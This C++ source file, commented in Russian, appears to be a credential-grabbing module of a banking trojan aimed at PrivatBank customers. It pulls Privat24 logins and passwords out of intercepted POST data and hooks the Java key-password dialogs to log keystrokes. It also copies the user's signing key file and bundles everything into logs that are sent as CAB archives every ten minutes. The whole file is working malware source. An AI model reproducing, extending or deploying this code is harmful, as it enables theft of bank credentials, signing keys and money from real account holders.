#ifndef PrivatBankH
	#error Exclude module from project
#endif


#pragma hdrstop

#include "PrivatBank.h"
#include "JavaAppletGrabbers.h"
#include "WndUtils.h"
#include "UniversalKeyLogger.h"
#include "Strings.h"
#include "Utils.h"
#include "StrConsts.h"
#include "BotClasses.h"
//---------------------------------------------------------------------------


#include "BotDebug.h"

namespace PPRIVATDEBUGSTRINGS
{
	#include "DbgTemplates.h"
}

// Объявляем шаблон вывода отладочных строк
#define PRVDBG PPRIVATDEBUGSTRINGS::DBGOutMessage<>


// Строки определены в модуле StrConsts.cpp

extern CSSTR EStrPrivatBankGrabber[]; // Имя системы грабера приватбанка
extern CSSTR EStrPrivatBankKeyPassWndMask[];  // Маска заголовка окна ввода проля
extern CSSTR EStrPrivatBankKeyPassWndMask2[]; // Маска заголовка второго окна ввода проля
extern CSSTR EStrPrivatBankLoginMask[]; // Маска определения адреса авторизации в приват24
extern CSSTR EStrPrivatBankLogin[];    // логин
extern CSSTR EStrPrivatBankPassword[]; // пароль



namespace  PrivatBank
{

	// Динамические данные
	DWORD PID = 0;
	string* LoginURLMask; // Маска определения адреса авторизации
	TPrivatBank *Grabber = NULL;
	//------------------------------------------------



	//------------------------------------------------
	//  ShowWndHandler - обрабатываем событие закрытия
	//                   окна
	//------------------------------------------------
   /*	void WINAPI ShowWndHandler(PKeyLogger, DWORD, LPVOID Data)
	{
		if (!Grabber) return;

		PShowWindowData SW = (PShowWindowData)Data;

		if (SW->Command == SW_HIDE && SW->Window == Grabber->Wnd())
		{
			// При закрытии окна отправляем лог
			Grabber->SendLog();
			delete Grabber;
			Grabber = NULL;
            KeyLogger::DisconnectEventHandler(KLE_SHOW_WND, ShowWndHandler);
		}
	}  */



}



//------------------------------------------------
//  Initialize - Функция инициализирует грабер
//				 пароля ключа приватбанка
//------------------------------------------------
bool PrivatBank::Initialize(HWND Wnd, DWORD  WndClassHash)
{
	if (WndClassHash != JAVAWND_SUNAWTDIALOG)
		return false;

	// Определяем текст окна
	string WndText = GetWndText2(Wnd);
	int WndType = TPrivatBank::IsKeyPassWnd(WndText);
	if (!WndType) return false;

	if (IsNewProcess(PID))
	{
		// Инициализируем данны в новом процессе
    	Grabber = NULL;
    }

	if (!Grabber)
	{
		PRVDBG("PrivatKeyPass", "Грабер пароля ключа приватбанка инициализирован");

		Grabber = new TPrivatBank();
		Grabber->ActivateKeyPassLogger(Wnd, WndText, WndType);
	}

	return true;
}



//------------------------------------------------
//  CheckPostData - Функция проверяет пост данные
//                  на предмет обнаружения логина
//                  и пароля
//
//  Приват отправляет данные в виде
//  "UserName=login&UserPass=pass&......
//------------------------------------------------
void PrivatBank::CheckPostData(const char* URL, const char* PostData)
{

	if (IsNewProcess(PID))
	{
		// Инициализируем данны в новом процессе
		LoginURLMask = new string(GetStr(EStrPrivatBankLoginMask));
	}

	//проверяем адрес
	if (!WildCmp(URL, LoginURLMask->t_str()))
		return;

	// Получаем логин и пароль
	string Login    = GetStr(EStrPrivatBankLogin);
	string Password = GetStr(EStrPrivatBankPassword);

	bool Valid = (STRA::Pos(PostData, Login.t_str()) >= 0) &&
				 (STRA::Pos(PostData, Password.t_str()) >= 0);
	if (!Valid) return;

	// Разбираем данные и извлекаем пароль
	TBotStrings Fields;
	Fields.SetDelimetedText(PostData, "&");

	string LoginValue      = Fields.GetValue(Login);
	string PasswordValue   = Fields.GetValue(Password);

	// Сохраняем данные
	if (!LoginValue.IsEmpty() && !PasswordValue.IsEmpty())
	{
		TPrivatBank Grabber;
		Grabber.AddLoginAndPassword(LoginValue, PasswordValue);
    }
}






//*****************************************************
// Грабер приватбанка
//*****************************************************
TPrivatBank::TPrivatBank()
	: TGrabber(GetStr(EStrPrivatBankGrabber))
{
	FLog = NULL;
	FKeyPassWnd = NULL;
}

TPrivatBank::~TPrivatBank()
{
	if (FLog) delete FLog;
}


//------------------------------------------------
// Функция инициализирует файлы логов
//------------------------------------------------
bool TPrivatBank::InitializeMainLog()
{
	if (!FLog)
	{
		FLog = new TGrabberFile(Name(), NULL, false);
		bool Created;
		FLog->Activate(&Created);
		if (Created)
		{
			FLog->SetSendAsCAB(true);
//			FLog->SetSendInterval(300000);
			FLog->SetSendInterval(600000);  // Задержка 10 минут
        }
	}
	return FLog->Active();
}

//------------------------------------------------
// Функция добавляет в лог логин и пароль
//------------------------------------------------
void TPrivatBank::AddLoginAndPassword(const string& Login, const string& Password)
{
	// При авторизации, закрываем старый лог
	if (FLog)
	{
		delete FLog;
		FLog = NULL;
	}

	TGrabberFile Log(Name());
	Log.CloseLog();

	if (InitializeMainLog())
	{
		FLog->AddText(GetStr(EStrLogFieldLogin), Login);
		FLog->AddText(GetStr(EStrLogFieldPassword), Password);
    }
}

//------------------------------------------------
//  Функция добавляет файл ключа в архив
//------------------------------------------------
void TPrivatBank::AddKeyFile(const string& FileName)
{
	if (InitializeMainLog())
	{
		FLog->AddFile("Key", FileName, "Key", NULL);
	}
}


//------------------------------------------------
//  Функция активирует логер пароля ключа
//------------------------------------------------
void TPrivatBank::ActivateKeyPassLogger(HWND Wnd, const string& WndText, int WndType)
{
	if (!Wnd) return;

	FKeyPassWnd = Wnd;

	// Определяем имя поля
	FKeyPassFieldName = GetStr(EStrLogFieldKeyPassword);
	if (WndType == 2)
		FKeyPassFieldName += "2";

	// Получаем имя файла ключа из заголовка окна
	if (WndType == 1) ParseKeyFileName(WndText);

	// Активируем лог
	InitializeMainLog();

	// Подключаемся к кейлогеру
	ConnectToKeyLogger();
}


//------------------------------------------------
// Функция проверяет заголовок окна и возвращает
// не нулевое значение если окно является окном
// ввода пароля улюча
// Результат:
//            1 - Окно ввода основного пароля
//            2 - Окно ввода второго пароля
//------------------------------------------------
int TPrivatBank::IsKeyPassWnd(const string& WndText)
{
	if (!WndText.IsEmpty())
    {
		// Проверяем основной пароль
		string Mask = GetStr(EStrPrivatBankKeyPassWndMask);
		if (WildCmp(WndText.t_str(), Mask.t_str()))
			return 1;

		// Проверяем второй пароль
		Mask = GetStr(EStrPrivatBankKeyPassWndMask2);
		if (WildCmp(WndText.t_str(), Mask.t_str()))
			return 2;
    }
	return 0;
}

//------------------------------------------
//  Функция разбирает заколовок окна
//  в поисках имени файла ключа
//------------------------------------------
void TPrivatBank::ParseKeyFileName(const string& Text)
{
	PCHAR File = STRA::Scan(Text.t_str(), '"');
	if (!File) return;
	File++;
	PCHAR End = STRA::Scan(File, '"');
	if (End)
	{
		*End = 0;
		if (File::IsExists(File))
			AddKeyFile(File);
    }
}

//------------------------------------------
//  Функция сохранет лог клавиатуры
//------------------------------------------
void TPrivatBank::LogKeyboad(HWND aWnd, const char* Text)
{
	if (aWnd == FKeyPassWnd)
	{
		if (FLog)
		{
			FLog->AddTextPart(FKeyPassWnd, FKeyPassFieldName, Text);
		}
    }
}


//------------------------------------------
// Функция обработки глоальных событий
//------------------------------------------
void TPrivatBank::DoEvent(int EventId, LPVOID Param)
{
	// Обрабатываем  зкрытие окна
	if (EventId != KLE_SHOW_WND) return;

	PShowWindowData SW = (PShowWindowData)Param;

	if (SW->Command == SW_HIDE && SW->Window == FKeyPassWnd)
	{
		// При закрытии окна закрываем лог
		if (PrivatBank::Grabber == this)
		{
			PrivatBank::Grabber = NULL;
			delete this;   // Самоуничтожаемся
        }
	}
}





